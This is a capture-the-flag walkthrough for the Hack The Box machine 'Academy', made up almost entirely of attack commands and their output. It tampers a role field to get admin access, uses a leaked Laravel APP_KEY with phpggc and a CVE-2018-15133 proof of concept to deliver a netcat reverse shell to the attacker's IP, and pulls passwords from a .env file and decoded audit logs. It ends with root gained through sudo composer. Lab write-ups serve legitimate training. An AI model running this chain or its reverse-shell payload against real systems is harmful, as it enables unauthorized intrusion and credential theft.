![Bashed.PNG](/assets/Machines/Easy/Academy/Academy.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.215
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.215
```
**Output**
```bash
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
33060/tcp open  mysqlx
```

3. To look the web page do **virtual hosting**, put next content in `/etc/hosts`
```
<IP Machine> academy.htb
```

![webpage.PNG](/assets/Machines/Easy/Academy/webpage.PNG)

4. Capture a petition of register with **BurpSuite**

![register.PNG](/assets/Machines/Easy/Academy/register.PNG)
![petition.PNG](/assets/Machines/Easy/Academy/petition.PNG)

* We watch field **roleid**, change **0** to **1** to login how administrator.


5. Now go to **admin.php** file and login with previous credentials.

**Output**

![admin.PNG](/assets/Machines/Easy/Academy/admin.PNG)

* We watch other url to visit **dev-staging-01.academy.htb**, put this in `/etc/hosts`

6. Visit new web page

![webpage2.PNG](/assets/Machines/Easy/Academy/webpage2.PNG)

7. Searching information in page we get this:

* The webpage use **Laravel** and we get **APP_KEY** (dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=)


8. Search exploit with Laravel:

| Site | Url |
|:----:|:---:|
| **Laravel Exploitation** | https://github.com/kozmic/laravel-poc-CVE-2018-15133 |
| **phpgcc** | https://github.com/ambionics/phpggc |

9. Clone two previous repositories

10. First, use **phpgcc** to enconde data with any command
Use of phpgcc:
```bash
EXAMPLES
./phpggc -l
./phpggc -l drupal
./phpggc Laravel/RCE1 system id
./phpggc SwiftMailer/FW1 /var/www/html/shell.php /path/to/local/shell.php
```
* Remember use: https://www.revshells.com/
  
Command to encode: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.32 4545 >/tmp/f`

```bash
./phpggc Laravel/RCE1 system 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <tun0 OP> <Port> >/tmp/f' -b
```

**Output**
```bash
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjczOiJybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfHNoIC1pIDI+JjF8bmMgMTAuMTAuMTQuMzIgNDU0NSA+L3RtcC9mIjt9
```

11. Now use Laravel Exploitation
Use of Laravel Exploitation:
```bash
Usage: ./cve-2018-15133.php <base64encoded_APP_KEY> <base64encoded-payload>
```

* We have APP_KEY and we enconde data with phpgcc previously

```bash
┌──(root㉿kali)-[/home/…/Machines/Easy/Academy/laravel-poc-CVE-2018-15133]
└─| ./cve-2018-15133.php dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjczOiJybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfHNoIC1pIDI+JjF8bmMgMTAuMTAuMTQuMzIgNDU0NSA+L3RtcC9mIjt9
```

**Output**
```bash
HTTP header for POST request: 
X-XSRF-TOKEN: eyJpdiI6IlZ6Z3VOcHF3MWN0VmFVNjNjTXQ0RGc9PSIsInZhbHVlIjoiWklVSWxxeTk5UTdDdWRrbFU4TXZFdWpmbWxHRGZEZ1lkNVoxSkpIV3RrVEZpSHYyZUJ1dnVTVWUxcWJsU1pOYWRjU3VWZXpWckNyRGJjTkpmRFpPOUdKaVIrazZHQUMxSzJZNTlcL3pDV24rTlRoV05oczFpMHBkVTRudGpHcDVNYWZzSXZHSTZVUGE0N2RST2Q1bDg3NkxEbWNOQlZ5YmdJSEhmbklqdmVQd2NBWWVleWlqeFJBZEd4XC9hZmRcL2hVajc1WG5pWmRMWFNVTWJkOXRyb0I0NzlYTFB2ZWlyYWhMeEx1ZExHRjRUMHJxM00rUmdCdU9VU1IwU0o5b3R0bWxLYUE4Um11RFc4OUVYa0hwMlFVdGVcL2dSYlBqSnRSQm9hOW5vNDJiMmpUVllwUjVQdTlVVXAxMDhxamhBemsxQmRBSVVtYVQ3UHE1Ymh4cnRUSjRodz09IiwibWFjIjoiNTJkMDdhMGI1YjEyOGE5MGU4ODgzY2E5ZDRmOGM3YzNjODBkYTE4NTgwMWFlZWJmMmI5OTk4Y2QwYjUyMmY2YyJ9
```

12. With the previous data use curl
```bash
┌──(root㉿kali)-[/home/…/Machines/Easy/Academy/laravel-poc-CVE-2018-15133]
└─| curl -s -X POST -H "X-XSRF-TOKEN: eyJpdiI6Ik1kXC9pdEU1dTBsVEtwN2ozSDFCSnFRPT0iLCJ2YWx1ZSI6IlQ1dE8zSWJEQ2I1R0puMGs5dW5yQkRQTkEya3h3WFVnbkwrZUlTSnhsN1BjUXV1N3ZUU201eWQyZU9ZUzJKUTF5Z0hmWUR3Q1plMG83Z25QUTkzdzdPTlNiUldqakQ3NFdUWGtMWVRFVGc1VkpsSjI1YytvbktLZFZnUktWV2pUemtGM1Mwa1lFZDNTQ0xQWkFnb1ZRXC9GTXdCYnZcL2tCQTNSaGFNSWhJU1JBS2tNQkp5RTBNb1NrWXlUWFhuOWFVYXJIRGZSQ1dZUzloUGN4ZFcyZUtFcTBTR2t4c3JwZVdTSkRRS2diUE1LV0NUZFo0REVLc1dPU2hmaitZSDd1SEpmVitVKzVlRUtUWU1jN29HRVwvMXZGSUJ1ZnhBcnV1ZTNXaHVXZkg1aFpCVkRCdU5IYU10UyswSG9FNk4yUGZnTm9sUTBUbEVjRVg5azNSZ2RVSHdPZz09IiwibWFjIjoiNTU5NmMyMDllMTgwNmRmNGRiODY2MjhhNmNhN2JlYjQ5OGViYWQ4N2FjOGZkYTFmYWMxODkzZjJhODBiYTcxMSJ9" http://dev-staging-01.academy.htb/
```

* Remember listen on port choose with **nc**

13. We obtain a reverse shell
```bash
www-data@academy:/var/www/html/htb-academy-dev-01/public$ whoami
www-data
```

14. To obtain a password of user **cry0l1t3** (In this directoy is the **user flag**), search for **.env** file in `/var/www/html/academy`

`DB_PASSWORD=mySup3rP4s5w0rd!!`

15. Login with **cry0l1t3** user and cat user flag
```bash
cry0l1t3@academy:~$ cat user.txt 
74fa2d27056f3dd16dc39355da76d8b1
```

16. Search the groups of current user
```bash
cry0l1t3@academy:~$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```

* **adm** group we get access to look logs

17. Search logs in `/var/log/audit`
```bash
cry0l1t3@academy:/var/log/audit$ ls
audit.log  audit.log.1  audit.log.2  audit.log.3
```


18. Use grep to filter with special words
First, filter info with **suid of users**, in this case **uid=1001 is important** and **cmd**
```bash
cry0l1t3@academy:/var/log/audit$ grep -r "1001" | grep "cmd"
```

**Output**
```bash
udit.log:type=USER_CMD msg=audit(1612880564.224:115): pid=1336 uid=1001 auid=1001 ses=1 msg='cwd="/home/mrb3n" cmd=636F6D706F736572202D2D776F726B696E672D6469723D2F746D702F746D702E6F4A4833443269514D322072756E2D7363726970742078 terminal=tty1 res=success'
audit.log:type=USER_CMD msg=audit(1612880564.412:119): pid=1353 uid=0 auid=1001 ses=1 msg='cwd="/tmp/tmp.oJH3D2iQM2" cmd=7375646F202D4B terminal=tty1 res=success'
audit.log:type=USER_CMD msg=audit(1612880607.016:128): pid=1788 uid=0 auid=1001 ses=1 msg='cwd="/tmp/tmp.oJH3D2iQM2" cmd=2F7573722F62696E2F656469746F72202D2D202F terminal=tty1 res=success'
audit.log.3:type=USER_CMD msg=audit(1597270864.489:242): pid=2867 uid=1001 auid=1002 ses=12 msg='cwd="/dev/shm" cmd=2F7573722F62696E2F636F6D706F73657220657865632062617368 terminal=pts/0 res=success'
audit.log.3:type=USER_CMD msg=audit(1597270899.797:255): pid=2911 uid=1001 auid=1002 ses=12 msg='cwd="/dev/shm" cmd=2F7573722F62696E2F636F6D706F73657220657865632062617368 terminal=pts/0 res=success'
audit.log.3:type=USER_CMD msg=audit(1597270919.981:268): pid=2941 uid=1001 auid=1002 ses=12 msg='cwd="/dev/shm" cmd=2F7573722F62696E2F636F6D706F7365722065786563207368 terminal=pts/0 res=success'
audit.log.3:type=USER_CMD msg=audit(1597271039.477:281): pid=3007 uid=1001 auid=1002 ses=12 msg='cwd="/dev/shm" cmd=636F6D706F73657220657865632062617368202D6320226261736822 terminal=pts/0 res=success'
audit.log.3:type=USER_CMD msg=audit(1597271084.121:300): pid=3048 uid=1001 auid=1002 ses=12 msg='cwd="/dev/shm" cmd=2F7573722F62696E2F636F6D706F73657220657865632062617368202D6320226261736822 terminal=pts/0 res=success'
audit.log.3:type=USER_CMD msg=audit(1597271116.377:313): pid=3087 uid=1001 auid=1002 ses=12 msg='cwd="/dev/shm" cmd=2F7573722F62696E2F636F6D706F73657220657865632062617368202D6320226261736822 terminal=pts/0 res=success'
audit.log.3:type=USER_CMD msg=audit(1597271160.921:326): pid=3127 uid=1001 auid=1002 ses=12 msg='cwd="/dev/shm" cmd=2F7573722F62696E2F636F6D706F7365722065786563206370202F62696E2F73682070776E3B2063686D6F6420752B73202E2F70776E terminal=pts/0 res=success'
audit.log.3:type=USER_CMD msg=audit(1597271315.669:345): pid=3223 uid=1001 auid=1002 ses=12 msg='cwd="/var/tmp/pwn" cmd=2F7573722F62696E2F636F6D706F7365722065786563206370202F7573722F62696E2F646173682070776E3B2063686D6F6420752B73202E2F70776E terminal=pts/0 res=success'
```

19. Filter only for cmd data
```bash
cry0l1t3@academy:/var/log/audit$ grep -r "1001" | grep "cmd" | tr ' ' '\n' | grep "cmd" | awk '{print $2}' FS='=' | xxd -ps -r;echo
```

**Output**
```bash
composer --working-dir=/tmp/tmp.oJH3D2iQM2 run-script xsudo -K/usr/bin/editor -- //usr/bin/composer exec bash/usr/bin/composer exec bash/usr/bin/composer exec shcomposer exec bash -c "bash"/usr/bin/composer exec bash -c "bash"/usr/bin/composer exec bash -c "bash"/usr/bin/composer exec cp /bin/sh pwn; chmod u+s ./pwn/usr/bin/composer exec cp /usr/bin/dash pwn; chmod u+s ./pwn
```


20.  Now filter **TTY**
```bash
cry0l1t3@academy:/var/log/audit$ grep -r TTY | awk NF'{print $NF}' | awk '{print $2}' FS='=' | xxd -ps -r | less
```

**Output**
```bash
su mrb3n
mrb3n_Ac@d3my!
whoami
exit
/bin/bash -i
```

21. Login how **mrb3n** and search ways to exploit privileges
```bash
mrb3n@academy:/var/log/audit$ sudo -l
[sudo] password for mrb3n: 
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```

22. Use GTFOBins

![composer.PNG](/assets/Machines/Easy/Academy/composer.PNG)

23. Use **sudo** binary exploitation
```bash
mrb3n@academy:/var/log/audit$ TF=$(mktemp -d)
mrb3n@academy:/var/log/audit$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
mrb3n@academy:/var/log/audit$ sudo composer --working-dir=$TF run-script x
PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
# whoami
root
```

24. Cat **root flag**
```bash
# cat /root/root.txt
3fc0df838bdb6f09bec0da8cccec6c3e
```